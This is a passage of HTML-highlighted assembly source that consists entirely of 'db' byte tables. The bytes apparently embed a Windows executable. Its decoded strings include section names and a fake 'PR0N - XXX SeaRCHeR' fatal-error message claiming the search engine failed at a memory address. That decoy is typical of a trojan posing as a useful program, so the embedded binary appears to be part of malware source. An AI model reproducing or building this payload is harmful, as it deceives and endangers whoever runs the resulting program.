    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">037h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">036h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">097h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">082h</span><span class="sc0">
